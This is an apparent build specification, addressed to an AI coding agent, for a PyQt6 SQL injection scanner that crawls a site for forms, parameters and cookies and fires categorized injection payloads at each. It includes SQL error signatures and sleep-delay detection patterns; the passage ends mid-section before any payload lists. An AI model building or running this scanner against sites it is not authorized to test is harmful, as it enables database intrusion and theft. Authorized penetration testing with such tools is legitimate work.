# SQLi Engine — AI Agent Build Specification
# Version: 2.0 | Target: Kali Linux | Stack: Python 3.11 + PyQt6 + SQLite
# ─────────────────────────────────────────────────────────────────────────
# INSTRUCTIONS FOR AI AGENT:
#   - Read this file top to bottom before writing any code.
#   - Create EVERY file listed. Do not skip any file.
#   - Follow EXACT class names, method names, signal names, and imports.
#   - Do not rename anything. Other files import by these exact names.
#   - Build files in the ORDER given in SECTION 0.
#   - When a file says "COMPLETE FILE CONTENT" — write exactly that.
#   - When a file says "IMPLEMENT THIS" — write full working Python code
#     that satisfies every bullet point listed under it.
#   - Never leave placeholder comments like "# TODO" or "# implement this".
#   - All code must run without modification on Kali Linux Python 3.11.
# ─────────────────────────────────────────────────────────────────────────

---

## SECTION 0 — BUILD ORDER (follow this exact sequence)

```
Step 1:  requirements.txt          (no dependencies)
Step 2:  install.sh                (no dependencies)
Step 3:  core/__init__.py          (empty file)
Step 4:  core/models.py            (all shared dataclasses — others import this)
Step 5:  core/rate_controller.py   (imports: threading, time only)
Step 6:  core/analyzer.py          (imports: core.models only)
Step 7:  core/history_manager.py   (imports: core.models, sqlite3, threading)
Step 8:  core/crawler.py           (imports: core.models, PyQt6, requests, bs4)
Step 9:  core/injector.py          (imports: core.models, core.analyzer,
                                    core.rate_controller, core.history_manager)
Step 10: gui/__init__.py           (empty file)
Step 11: gui/widgets/__init__.py   (empty file)
Step 12: gui/widgets/vector_tree.py
Step 13: gui/widgets/payload_selector.py
Step 14: gui/widgets/live_feed.py
Step 15: gui/scanner_tab.py
Step 16: gui/results_tab.py
Step 17: gui/history_tab.py
Step 18: gui/settings_tab.py
Step 19: gui/main_window.py
Step 20: main.py
Step 21: wordlists/union_payloads.txt
Step 22: wordlists/blind_boolean_payloads.txt
Step 23: wordlists/blind_time_payloads.txt
Step 24: wordlists/error_based_payloads.txt
Step 25: wordlists/stacked_queries_payloads.txt
Step 26: wordlists/out_of_band_payloads.txt
Step 27: wordlists/auth_bypass_payloads.txt
Step 28: wordlists/second_order_payloads.txt
Step 29: wordlists/waf_bypass_payloads.txt
```

---

## SECTION 1 — PROJECT DIRECTORY STRUCTURE

Create this exact layout. Every file must exist.

```
sqli-engine/
├── main.py
├── requirements.txt
├── install.sh
├── core/
│   ├── __init__.py          ← empty file
│   ├── models.py            ← ALL shared dataclasses live here
│   ├── rate_controller.py
│   ├── analyzer.py
│   ├── history_manager.py
│   ├── crawler.py
│   └── injector.py
├── gui/
│   ├── __init__.py          ← empty file
│   ├── main_window.py
│   ├── scanner_tab.py
│   ├── results_tab.py
│   ├── history_tab.py
│   ├── settings_tab.py
│   └── widgets/
│       ├── __init__.py      ← empty file
│       ├── vector_tree.py
│       ├── payload_selector.py
│       └── live_feed.py
├── wordlists/
│   ├── union_payloads.txt
│   ├── blind_boolean_payloads.txt
│   ├── blind_time_payloads.txt
│   ├── error_based_payloads.txt
│   ├── stacked_queries_payloads.txt
│   ├── out_of_band_payloads.txt
│   ├── auth_bypass_payloads.txt
│   ├── second_order_payloads.txt
│   └── waf_bypass_payloads.txt
├── db/                      ← auto-created by history_manager.py
└── exports/                 ← auto-created by main.py
```

---

## SECTION 2 — requirements.txt

COMPLETE FILE CONTENT — write exactly this:

```
PyQt6>=6.5.0
requests>=2.31.0
beautifulsoup4>=4.12.0
lxml>=4.9.0
urllib3>=2.0.0
fake-useragent>=1.4.0
```

---

## SECTION 3 — install.sh

COMPLETE FILE CONTENT — write exactly this bash script:

```bash
#!/usr/bin/env bash
# SQLi Engine — Kali Linux Installer
# Usage: sudo bash install.sh

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo "============================================="
echo "   SQLi Engine Installer — Kali Linux"
echo "============================================="

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[ERROR] Please run as root: sudo bash install.sh${NC}"
  exit 1
fi

INSTALL_DIR="/opt/sqli-engine"
SOURCE_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "[1/6] Installing system dependencies..."
apt-get update -q
apt-get install -y \
    python3 \
    python3-pip \
    python3-venv \
    libxcb-xinerama0 \
    libxcb-cursor0 \
    libxcb1 \
    libx11-6 \
    libgl1 \
    2>/dev/null

echo "[2/6] Copying project to $INSTALL_DIR..."
mkdir -p "$INSTALL_DIR"
cp -r "$SOURCE_DIR"/. "$INSTALL_DIR/"
cd "$INSTALL_DIR"

echo "[3/6] Creating Python virtual environment..."
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip --quiet
pip install -r requirements.txt --quiet

echo "[4/6] Creating required directories..."
mkdir -p db exports wordlists

echo "[5/6] Creating CLI launcher at /usr/local/bin/sqli-engine..."
cat > /usr/local/bin/sqli-engine <<'LAUNCHER'
#!/bin/bash
source /opt/sqli-engine/venv/bin/activate
cd /opt/sqli-engine
python3 main.py "$@"
LAUNCHER
chmod +x /usr/local/bin/sqli-engine

echo "[6/6] Creating desktop shortcut..."
cat > /usr/share/applications/sqli-engine.desktop <<'DESKTOP'
[Desktop Entry]
Name=SQLi Engine
Comment=Graphical SQL Injection Testing Tool (Authorized Testing Only)
Exec=/usr/local/bin/sqli-engine
Terminal=false
Type=Application
Categories=Security;
DESKTOP

echo ""
echo -e "${GREEN}============================================="
echo "   Installation Complete!"
echo "============================================="
echo "  Run with:  sqli-engine"
echo "  Or:        python3 /opt/sqli-engine/main.py"
echo -e "=============================================${NC}"
```

---

## SECTION 4 — core/models.py

IMPLEMENT THIS FILE. It must contain ALL shared data structures.
No other file defines dataclasses. All files import from `core.models`.

Write a Python file with these exact dataclasses using `from dataclasses import dataclass, field` and `from typing import List, Optional, Dict` and `from datetime import datetime`:

### Dataclass: FormField
```
Fields:
  name:         str
  field_type:   str   # "text", "password", "hidden", "textarea", "select"
  value:        str   # default value found in HTML (default empty string "")
```

### Dataclass: FormVector
```
Fields:
  url:      str           # resolved absolute URL of form action
  method:   str           # "GET" or "POST"
  fields:   List[FormField]  # default empty list
  source_page: str        # page URL where form was found (default "")
```

### Dataclass: ParamVector
```
Fields:
  url:         str   # full URL with query string
  param_name:  str   # name of the injectable parameter
  param_value: str   # original value (default "")
  method:      str   # always "GET" (default "GET")
```

### Dataclass: CookieVector
```
Fields:
  name:     str
  value:    str
  url:      str   # URL where cookie was set
```

### Dataclass: SiteMap
```
Fields:
  target_url:     str
  pages:          List[str]         # default empty list  (list of visited URLs)
  forms:          List[FormVector]  # default empty list
  param_vectors:  List[ParamVector] # default empty list
  cookies:        List[CookieVector]# default empty list

Method (not a dataclass method, just define as regular method on the class):
  def all_vectors(self) -> list:
    # returns a unified list of dicts, each dict has keys:
    # "type"  → "form" | "param" | "cookie"
    # "data"  → the actual FormVector / ParamVector / CookieVector object
    # Used by injector to iterate all injection points uniformly
```

### Dataclass: ScanResult
```
Fields:
  timestamp:        datetime   # datetime.now() as default_factory
  session_id:       int        # default 0
  vector_type:      str        # "form" | "param" | "cookie"
  url:              str        # exact URL that was requested
  parameter:        str        # parameter name that was injected
  category:         str        # payload category name
  payload:          str        # exact payload string used
  status_code:      int        # HTTP status code (default 0)
  response_time_ms: float      # milliseconds (default 0.0)
  response_body:    str        # first 5000 chars of response (default "")
  response_length:  int        # full Content-Length (default 0)
  vulnerable:       bool       # default False
  vuln_type:        Optional[str]   # default None
  confidence:       Optional[str]   # "HIGH" | "MEDIUM" | "LOW" | None
```

### Dataclass: BaselineResponse
```
Fields:
  url:              str
  status_code:      int    # default 200
  response_length:  int    # default 0
  response_time_ms: float  # default 0.0
  body_snippet:     str    # first 500 chars (default "")
```

### Dataclass: SessionRow
```
Fields:
  id:          int
  target_url:  str
  started_at:  str   # ISO format string
  ended_at:    str   # ISO format string or "" if still running
  total_reqs:  int   # default 0
  vulns_found: int   # default 0
```

### Dataclass: RateConfig
```
Fields:
  requests_per_second: float  # default 5.0
  max_threads:         int    # default 10
  request_timeout_sec: int    # default 10
  max_total_requests:  int    # default 0  (0 means unlimited)
  delay_between_ms:    int    # default 0  (extra fixed delay after each req)
```

### Constants dict (module-level, not a class):
```python
CATEGORY_FILE_MAP = {
    "union":          "union_payloads.txt",
    "blind_boolean":  "blind_boolean_payloads.txt",
    "blind_time":     "blind_time_payloads.txt",
    "error_based":    "error_based_payloads.txt",
    "stacked":        "stacked_queries_payloads.txt",
    "oob":            "out_of_band_payloads.txt",
    "auth_bypass":    "auth_bypass_payloads.txt",
    "second_order":   "second_order_payloads.txt",
    "waf_bypass":     "waf_bypass_payloads.txt",
}

CATEGORY_DISPLAY_NAMES = {
    "union":         "Union-Based",
    "blind_boolean": "Boolean Blind",
    "blind_time":    "Time-Based Blind",
    "error_based":   "Error-Based",
    "stacked":       "Stacked Queries",
    "oob":           "Out-of-Band",
    "auth_bypass":   "Auth Bypass",
    "second_order":  "Second Order",
    "waf_bypass":    "WAF Bypass",
}
```

---

## SECTION 5 — core/rate_controller.py

IMPLEMENT THIS FILE.

```python
# Imports allowed: threading, time only. No PyQt6 here.
```

### Class: RateLimiter

```
__init__(self, requests_per_second: float = 5.0):
    self._rps        = requests_per_second
    self._interval   = 1.0 / requests_per_second
    self._last_call  = 0.0
    self._lock       = threading.Lock()
    self._paused     = False
    self._pause_event = threading.Event()
    self._pause_event.set()   # set means NOT paused (can proceed)

acquire(self) -> None:
    # Block until allowed to send a request.
    # Steps:
    #   1. Wait if paused: self._pause_event.wait()
    #   2. With self._lock:
    #        now = time.monotonic()
    #        elapsed = now - self._last_call
    #        if elapsed < self._interval:
    #            time.sleep(self._interval - elapsed)
    #        self._last_call = time.monotonic()

set_rps(self, rps: float) -> None:
    # Update rate while scan is running. Thread-safe.
    # Guard: if rps <= 0, set to 0.1 to avoid divide-by-zero
    with self._lock:
        self._rps = max(0.1, rps)
        self._interval = 1.0 / self._rps

pause(self) -> None:
    self._paused = True
    self._pause_event.clear()   # clear means paused

resume(self) -> None:
    self._paused = False
    self._pause_event.set()     # set means running

is_paused(self) -> bool:
    return self._paused
```

---

## SECTION 6 — core/analyzer.py

IMPLEMENT THIS FILE.

```python
# Imports: from core.models import ScanResult, BaselineResponse
# No PyQt6. No network calls. Pure analysis logic.
```

### Module-level constant (copy exactly):

```python
DB_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysqli",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query(): query failed",
    "pg_exec(): query failed",
    "supplied argument is not a valid postgresql",
    "invalid input syntax for type",
    "unterminated string literal",
    "odbc sql server driver",
    "microsoft ole db provider for sql server",
    "microsoft jet database engine",
    "error converting data type",
    "sqlite_exception",
    "sqlite3::",
    "ora-00933",
    "ora-00907",
    "ora-01756",
    "ora-00936",
    "db2 sql error",
    "cli driver",
    "sqlstate",
    "syntax error at or near",
    "division by zero",
    "invalid column name",
    "invalid object name",
    "column does not exist",
]
```

### Function: analyze_response

```
Signature:
  def analyze_response(result: ScanResult,
                       baseline: BaselineResponse) -> tuple[bool, str | None, str | None]:
  # Returns: (is_vulnerable: bool, vuln_type: str | None, confidence: str | None)

Logic (check in this exact order — return immediately on first match):

  CHECK 1 — Error-Based:
    body_lower = result.response_body.lower()
    for each sig in DB_ERROR_SIGNATURES:
      if sig in body_lower:
        return (True, "Error-Based SQLi", "HIGH")

  CHECK 2 — Union-Based:
    if result.category == "union":
      if result.response_length > baseline.response_length * 1.3:   # 30% larger
        return (True, "Union-Based SQLi", "MEDIUM")

  CHECK 3 — Time-Based Blind:
    if result.category == "blind_time":
      # extract expected delay: scan payload for SLEEP(N) or WAITFOR DELAY '0:0:N'
      # use regex: r'SLEEP\((\d+)\)' and r"DELAY '0:0:(\d+)'"
      # if found and result.response_time_ms >= (found_seconds * 1000 * 0.75):
      return (True, "Time-Based Blind SQLi", "HIGH")

  CHECK 4 — Boolean Blind:
    # This check is SKIPPED for individual results.
    # Boolean blind is detected at the injector level by comparing
    # true-payload result length vs false-payload result length.
    # analyzer.py does NOT implement this check.
    pass

  CHECK 5 — Auth Bypass:
    if result.category == "auth_bypass":
      if result.status_code in (301, 302, 303, 307, 308):
        return (True, "Auth Bypass SQLi", "HIGH")
      body_lower = result.response_body.lower()
      auth_success_keywords = [
          "welcome", "dashboard", "logout", "log out",
          "sign out", "my account", "profile", "admin panel"
      ]
      for kw in auth_success_keywords:
        if kw in body_lower:
          return (True, "Auth Bypass SQLi", "MEDIUM")

  CHECK 6 — HTTP 500 Anomaly:
    if result.status_code == 500 and baseline.status_code != 500:
      return (True, "Possible Error-Based SQLi (HTTP 500)", "LOW")

  DEFAULT — not vulnerable:
    return (False, None, None)
```

### Function: extract_sleep_seconds

```
Signature: def extract_sleep_seconds(payload: str) -> float
# Used internally by analyze_response for CHECK 3.
# Use re.search with IGNORECASE.
# Pattern 1: SLEEP(N)         → re.search(r'SLEEP\((\d+(?:\.\d+)?)\)', payload, re.I)
# Pattern 2: WAITFOR DELAY    → re.search(r"DELAY\s+'0:0:(\d+)'", payload, re.I)
# Pattern 3: pg_sleep(N)      → re.search(r'pg_sleep\((\d+(?:\.\d+)?)\)', payload, re.I)
# Return float of seconds, or 5.0 as default if no pattern found.
```

---

## SECTION 7 — core/history_manager.py

IMPLEMENT THIS FILE.

```python
# Imports:
import sqlite3
import threading
import json
import csv
from pathlib import Path
from datetime import datetime
from core.models import ScanResult, SessionRow, SiteMap
```

### Class: HistoryManager

```
__init__(self, db_path: str = "db/history.sqlite"):
    self._db_path = db_path
    self._lock    = threading.Lock()
    Path(db_path).parent.mkdir(parents=True, exist_ok=True)
    self._init_schema()

_init_schema(self) -> None:
    # Connect and run this SQL exactly:
    #
    # PRAGMA journal_mode=WAL;
    #
    # CREATE TABLE IF NOT EXISTS sessions (
    #   id          INTEGER PRIMARY KEY AUTOINCREMENT,
    #   target_url  TEXT NOT NULL,
    #   started_at  TEXT NOT NULL,
    #   ended_at    TEXT DEFAULT '',
    #   total_reqs  INTEGER DEFAULT 0,
    #   vulns_found INTEGER DEFAULT 0
    # );
    #
    # CREATE TABLE IF NOT EXISTS results (
    #   id              INTEGER PRIMARY KEY AUTOINCREMENT,
    #   session_id      INTEGER NOT NULL,
    #   timestamp       TEXT,
    #   vector_type     TEXT,
    #   url             TEXT,
    #   parameter       TEXT,
    #   category        TEXT,
    #   payload         TEXT,
    #   status_code     INTEGER,
    #   response_time   REAL,
    #   response_body   TEXT,
    #   response_length INTEGER,
    #   vulnerable      INTEGER DEFAULT 0,
    #   vuln_type       TEXT DEFAULT '',
    #   confidence      TEXT DEFAULT '',
    #   FOREIGN KEY (session_id) REFERENCES sessions(id)
    # );
    #
    # CREATE TABLE IF NOT EXISTS vectors (
    #   id          INTEGER PRIMARY KEY AUTOINCREMENT,
    #   session_id  INTEGER NOT NULL,
    #   vector_type TEXT,
    #   url         TEXT,
    #   method      TEXT,
    #   param_name  TEXT,
    #   FOREIGN KEY (session_id) REFERENCES sessions(id)
    # );
    # Use with self._lock, use sqlite3.connect(self._db_path) context manager.

create_session(self, target_url: str) -> int:
    # INSERT INTO sessions (target_url, started_at) VALUES (?, ?)
    # started_at = datetime.now().isoformat()
    # Return lastrowid (the new session id as int)
    # Use self._lock

save_result(self, result: ScanResult) -> None:
    # INSERT INTO results (...all fields...) VALUES (...)
    # Map result fields to columns.
    # vulnerable stored as int: 1 if True else 0
    # timestamp stored as result.timestamp.isoformat()
    # Use self._lock
    # Catch all exceptions silently (scan must not stop on DB error)

close_session(self, session_id: int, total_reqs: int, vulns_found: int) -> None:
    # UPDATE sessions SET ended_at=?, total_reqs=?, vulns_found=? WHERE id=?
    # ended_at = datetime.now().isoformat()
    # Use self._lock

get_all_sessions(self) -> list[SessionRow]:
    # SELECT * FROM sessions ORDER BY id DESC
    # Return list of SessionRow objects

get_results_for_session(self, session_id: int) -> list[ScanResult]:
    # SELECT * FROM results WHERE session_id=? ORDER BY id ASC
    # Return list of ScanResult objects
    # Convert vulnerable int back to bool
    # Set timestamp = datetime.fromisoformat(row['timestamp'])

export_to_csv(self, session_id: int, filepath: str) -> None:
    # Get results, write CSV with headers matching ScanResult field names
    # Use csv.DictWriter

export_to_json(self, session_id: int, filepath: str) -> None:
    # Get results, serialize each ScanResult to dict
    # Convert datetime to isoformat string
    # Write pretty-printed JSON with indent=2

delete_session(self, session_id: int) -> None:
    # DELETE FROM results WHERE session_id=?
    # DELETE FROM vectors WHERE session_id=?
    # DELETE FROM sessions WHERE id=?
    # All in one connection, use self._lock
```

---

## SECTION 8 — core/crawler.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtCore import QThread, pyqtSignal
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from core.models import SiteMap, FormVector, FormField, ParamVector, CookieVector
```

### Class: CrawlerWorker(QThread)

```
SIGNALS (define as class-level attributes):
  page_found    = pyqtSignal(str)          # emits URL string of each visited page
  vector_found  = pyqtSignal(str, str)     # emits (vector_type, description)
  crawl_complete = pyqtSignal(object)      # emits SiteMap object
  crawl_error   = pyqtSignal(str)          # emits error message string
  progress      = pyqtSignal(int, int)     # emits (visited_count, queued_count)

__init__(self, target_url: str, max_depth: int = 3,
         headers: dict = None, max_pages: int = 200):
  super().__init__()
  self.target_url  = target_url
  self.max_depth   = max_depth
  self.headers     = headers or {"User-Agent": "Mozilla/5.0"}
  self.max_pages   = max_pages
  self._stop_flag  = False

stop(self) -> None:
  self._stop_flag = True

run(self) -> None:
  # This method runs in the background thread.
  # Wrap entire body in try/except; on exception emit crawl_error(str(e)) and return.
  #
  # ALGORITHM:
  #
  # site_map    = SiteMap(target_url=self.target_url)
  # visited     = set()
  # queue       = [(self.target_url, 0)]   # list of (url, depth) tuples
  # base_domain = urlparse(self.target_url).netloc
  #
  # WHILE queue is not empty AND len(visited) < self.max_pages:
  #   IF self._stop_flag: break
  #   (url, depth) = queue.pop(0)
  #   IF url in visited: continue
  #   IF depth > self.max_depth: continue
  #   IF urlparse(url).netloc != base_domain: continue
  #
  #   visited.add(url)
  #   self.progress.emit(len(visited), len(queue))
  #
  #   TRY:
  #     response = requests.get(url, headers=self.headers,
  #                             timeout=10, allow_redirects=True)
  #   EXCEPT requests.exceptions.RequestException:
  #     continue   # skip bad URLs silently
  #
  #   IF response.status_code not in (200, 301, 302): continue
  #
  #   site_map.pages.append(url)
  #   self.page_found.emit(url)
  #
  #   soup = BeautifulSoup(response.text, "lxml")
  #
  #   ── EXTRACT FORMS ──
  #   for form in soup.find_all("form"):
  #     action = form.get("action", "")
  #     action_url = urljoin(url, action) if action else url
  #     method = (form.get("method", "get")).upper()
  #     fields = []
  #     for inp in form.find_all(["input", "textarea", "select"]):
  #       name = inp.get("name")
  #       if not name: continue
  #       fields.append(FormField(
  #         name       = name,
  #         field_type = inp.get("type", "text"),
  #         value      = inp.get("value", "")
  #       ))
  #     if fields:
  #       fv = FormVector(url=action_url, method=method,
  #                       fields=fields, source_page=url)
  #       site_map.forms.append(fv)
  #       self.vector_found.emit("form",
  #         f"{method} {action_url} [{', '.join(f.name for f in fields)}]")
  #
  #   ── EXTRACT URL PARAMS ──
  #   parsed = urlparse(url)
  #   if parsed.query:
  #     for param_name in parse_qs(parsed.query).keys():
  #       pv = ParamVector(url=url, param_name=param_name,
  #                        param_value=parse_qs(parsed.query)[param_name][0])
  #       site_map.param_vectors.append(pv)
  #       self.vector_found.emit("param", f"GET {url} [{param_name}]")
  #
  #   ── EXTRACT LINKS & THEIR PARAMS ──
  #   for a_tag in soup.find_all("a", href=True):
  #     link = urljoin(url, a_tag["href"])
  #     link_parsed = urlparse(link)
  #     if link_parsed.netloc != base_domain: continue
  #     if link not in visited:
  #       queue.append((link, depth + 1))
  #     if link_parsed.query:
  #       for pname in parse_qs(link_parsed.query).keys():
  #         pv = ParamVector(url=link,
  #                          param_name=pname,
  #                          param_value=parse_qs(link_parsed.query)[pname][0])
  #         # Add only if not already in site_map (deduplicate by url+param_name)
  #         existing = [(p.url, p.param_name) for p in site_map.param_vectors]
  #         if (link, pname) not in existing:
  #           site_map.param_vectors.append(pv)
  #           self.vector_found.emit("param", f"GET {link} [{pname}]")
  #
  #   ── EXTRACT COOKIES ──
  #   for cookie_name, cookie_val in response.cookies.items():
  #     cv = CookieVector(name=cookie_name, value=cookie_val, url=url)
  #     existing_names = [c.name for c in site_map.cookies]
  #     if cookie_name not in existing_names:
  #       site_map.cookies.append(cv)
  #       self.vector_found.emit("cookie", f"Cookie: {cookie_name} @ {url}")
  #
  # self.crawl_complete.emit(site_map)
```

---

## SECTION 9 — core/injector.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtCore import QThread, pyqtSignal
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from pathlib import Path
from core.models import (SiteMap, ScanResult, BaselineResponse,
                          RateConfig, FormVector, ParamVector, CookieVector,
                          CATEGORY_FILE_MAP)
from core.analyzer import analyze_response
from core.rate_controller import RateLimiter
from core.history_manager import HistoryManager
```

### Class: InjectorWorker(QThread)

```
SIGNALS:
  scan_started      = pyqtSignal(int)       # emits total_requests count
  result_ready      = pyqtSignal(object)    # emits ScanResult object
  progress_updated  = pyqtSignal(int, int)  # emits (completed, total)
  scan_paused       = pyqtSignal()
  scan_resumed      = pyqtSignal()
  scan_complete     = pyqtSignal(int, int)  # emits (total_sent, vulns_found)
  scan_error        = pyqtSignal(str)       # emits error message

__init__(self, site_map: SiteMap, payloads: dict,
         rate_config: RateConfig, headers: dict,
         session_id: int, history: HistoryManager,
         wordlists_dir: str = "wordlists"):
  super().__init__()
  self.site_map     = site_map
  self.payloads     = payloads        # dict: {category_str: [payload_str, ...]}
  self.rate_config  = rate_config
  self.headers      = headers
  self.session_id   = session_id
  self.history      = history
  self._stop_flag   = False
  self._limiter     = RateLimiter(rate_config.requests_per_second)
  self._completed   = 0
  self._vulns       = 0
  self._lock        = threading.Lock()

stop(self)  -> None: self._stop_flag = True
pause(self) -> None: self._limiter.pause();  self.scan_paused.emit()
resume(self)-> None: self._limiter.resume(); self.scan_resumed.emit()
set_rps(self, rps: float) -> None: self._limiter.set_rps(rps)

run(self) -> None:
  # Wrap in try/except; on error emit scan_error(str(e)) and return.
  #
  # STEP 1: BUILD FULL JOB LIST
  #   jobs = []   ← list of (vector_type, vector_obj, category, payload)
  #
  #   for form_vector in self.site_map.forms:
  #     for field in form_vector.fields:
  #       if field.field_type in ("submit", "button", "image", "reset"):
  #         continue
  #       for category, payload_list in self.payloads.items():
  #         for payload in payload_list:
  #           jobs.append(("form", form_vector, field, category, payload))
  #
  #   for param_vector in self.site_map.param_vectors:
  #     for category, payload_list in self.payloads.items():
  #       for payload in payload_list:
  #         jobs.append(("param", param_vector, None, category, payload))
  #
  #   for cookie_vector in self.site_map.cookies:
  #     for category, payload_list in self.payloads.items():
  #       for payload in payload_list:
  #         jobs.append(("cookie", cookie_vector, None, category, payload))
  #
  #   If rate_config.max_total_requests > 0:
  #     jobs = jobs[:rate_config.max_total_requests]
  #
  #   self.scan_started.emit(len(jobs))
  #   total = len(jobs)
  #
  # STEP 2: GET BASELINE FOR EACH UNIQUE URL
  #   baselines = {}   ← dict: url → BaselineResponse
  #   unique_urls = set of all urls across all vectors
  #   for url in unique_urls:
  #     try:
  #       r = requests.get(url, headers=self.headers,
  #                        timeout=self.rate_config.request_timeout_sec)
  #       baselines[url] = BaselineResponse(
  #         url=url,
  #         status_code=r.status_code,
  #         response_length=len(r.text),
  #         response_time_ms=r.elapsed.total_seconds()*1000,
  #         body_snippet=r.text[:500]
  #       )
  #     except:
  #       baselines[url] = BaselineResponse(url=url)
  #
  # STEP 3: RUN INJECTION WITH THREAD POOL
  #   with ThreadPoolExecutor(max_workers=self.rate_config.max_threads) as pool:
  #     futures = {}
  #     for job in jobs:
  #       if self._stop_flag: break
  #       f = pool.submit(self._send_job, job, baselines)
  #       futures[f] = job
  #
  #     for future in as_completed(futures):
  #       if self._stop_flag: break
  #       result = future.result()
  #       if result is None: continue
  #       with self._lock:
  #         self._completed += 1
  #         if result.vulnerable:
  #           self._vulns += 1
  #       self.history.save_result(result)
  #       self.result_ready.emit(result)
  #       self.progress_updated.emit(self._completed, total)
  #
  # STEP 4: CLOSE SESSION AND EMIT COMPLETE
  #   self.history.close_session(self.session_id,
  #                               self._completed, self._vulns)
  #   self.scan_complete.emit(self._completed, self._vulns)

_send_job(self, job: tuple, baselines: dict) -> ScanResult | None:
  # Internal method — runs in thread pool thread.
  # job is a tuple:
  #   if job[0] == "form":   (type, FormVector, FormField, category, payload)
  #   if job[0] == "param":  (type, ParamVector, None, category, payload)
  #   if job[0] == "cookie": (type, CookieVector, None, category, payload)
  #
  # Acquire rate limiter before making request:
  #   self._limiter.acquire()
  #
  # Build and send request:
  #
  #   IF "form":
  #     form_vec, field = job[1], job[2]
  #     data = {f.name: f.value for f in form_vec.fields}
  #     data[field.name] = payload   ← inject into this specific field
  #     url = form_vec.url
  #     start = datetime.now()
  #     if form_vec.method == "POST":
  #       r = requests.post(url, data=data, headers=self.headers,
  #                         timeout=rate_config.request_timeout_sec,
  #                         allow_redirects=True)
  #     else:
  #       r = requests.get(url, params=data, headers=self.headers,
  #                        timeout=rate_config.request_timeout_sec,
  #                        allow_redirects=True)
  #     param_name = field.name
  #     vector_type = "form"
  #
  #   IF "param":
  #     pv = job[1]
  #     from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
  #     parsed = urlparse(pv.url)
  #     params = parse_qs(parsed.query)
  #     params[pv.param_name] = [payload]
  #     new_query = urlencode(params, doseq=True)
  #     injected_url = urlunparse(parsed._replace(query=new_query))
  #     start = datetime.now()
  #     r = requests.get(injected_url, headers=self.headers,
  #                      timeout=rate_config.request_timeout_sec,
  #                      allow_redirects=True)
  #     url = injected_url
  #     param_name = pv.param_name
  #     vector_type = "param"
  #
  #   IF "cookie":
  #     cv = job[1]
  #     cookie_headers = dict(self.headers)
  #     # Build cookie string with injected value
  #     cookie_headers["Cookie"] = f"{cv.name}={payload}"
  #     start = datetime.now()
  #     r = requests.get(cv.url, headers=cookie_headers,
  #                      timeout=rate_config.request_timeout_sec,
  #                      allow_redirects=True)
  #     url = cv.url
  #     param_name = cv.name
  #     vector_type = "cookie"
  #
  # After request:
  #   elapsed_ms = (datetime.now() - start).total_seconds() * 1000
  #
  #   result = ScanResult(
  #     session_id       = self.session_id,
  #     vector_type      = vector_type,
  #     url              = url,
  #     parameter        = param_name,
  #     category         = category,
  #     payload          = payload,
  #     status_code      = r.status_code,
  #     response_time_ms = elapsed_ms,
  #     response_body    = r.text[:5000],
  #     response_length  = len(r.text),
  #   )
  #
  #   baseline = baselines.get(job[1].url, BaselineResponse(url=job[1].url))
  #   is_vuln, vuln_type, confidence = analyze_response(result, baseline)
  #   result.vulnerable  = is_vuln
  #   result.vuln_type   = vuln_type
  #   result.confidence  = confidence
  #
  #   return result
  #
  # Wrap entire method in try/except Exception as e:
  #   return None   ← return None on any error, never crash the thread pool
```

### Standalone function: load_payloads

```python
def load_payloads(selected_categories: list[str],
                  wordlists_dir: str = "wordlists") -> dict:
    """
    Returns dict: { category_str: [payload_str, ...] }
    Reads from wordlists/ directory.
    Skips blank lines and lines starting with '#'.
    If file not found, stores empty list for that category (no crash).
    """
```

---

## SECTION 10 — gui/widgets/vector_tree.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import QTreeWidget, QTreeWidgetItem
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QColor
from core.models import SiteMap
```

### Class: VectorTree(QTreeWidget)

```
__init__(self, parent=None):
  super().__init__(parent)
  self.setHeaderLabels(["Type", "URL / Name", "Method", "Parameters"])
  self.setColumnWidth(0, 90)
  self.setColumnWidth(1, 300)
  self.setColumnWidth(2, 60)
  self.setColumnWidth(3, 200)
  self.setAlternatingRowColors(True)

populate(self, site_map: SiteMap) -> None:
  # Clear existing items: self.clear()
  #
  # Create three top-level category items:
  #   forms_item  = QTreeWidgetItem(["Forms",   "", "", ""])
  #   params_item = QTreeWidgetItem(["Params",  "", "", ""])
  #   cookie_item = QTreeWidgetItem(["Cookies", "", "", ""])
  # Style each header with bold font.
  # self.addTopLevelItem(forms_item)
  # self.addTopLevelItem(params_item)
  # self.addTopLevelItem(cookie_item)
  #
  # For each form in site_map.forms:
  #   field_names = ", ".join(f.name for f in form.fields)
  #   child = QTreeWidgetItem([
  #     "form",
  #     form.url,
  #     form.method,
  #     field_names
  #   ])
  #   Color child row: light green background for GET, light blue for POST
  #   forms_item.addChild(child)
  #
  # For each param in site_map.param_vectors:
  #   child = QTreeWidgetItem(["param", param.url, "GET", param.param_name])
  #   params_item.addChild(child)
  #
  # For each cookie in site_map.cookies:
  #   child = QTreeWidgetItem(["cookie", cookie.url, "-", cookie.name])
  #   cookie_item.addChild(child)
  #
  # Expand all top-level items: self.expandAll()
  #
  # Update header text to show counts:
  #   forms_item.setText(0, f"Forms ({len(site_map.forms)})")
  #   etc.
```

---

## SECTION 11 — gui/widgets/payload_selector.py

IMPLEMENT THIS FILE.

```python
# Imports:
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout,
                              QGroupBox, QCheckBox, QComboBox,
                              QPlainTextEdit, QLabel)
from PyQt6.QtCore import pyqtSignal
from pathlib import Path
from core.models import CATEGORY_FILE_MAP, CATEGORY_DISPLAY_NAMES
```

### Class: PayloadSelector(QWidget)

```
SIGNALS:
  selection_changed = pyqtSignal(list)   # emits list of selected category keys

__init__(self, wordlists_dir: str = "wordlists", parent=None):
  super().__init__(parent)
  self.wordlists_dir = wordlists_dir
  self._checkboxes   = {}   # dict: category_key → QCheckBox
  self._setup_ui()

_setup_ui(self) -> None:
  # Layout:
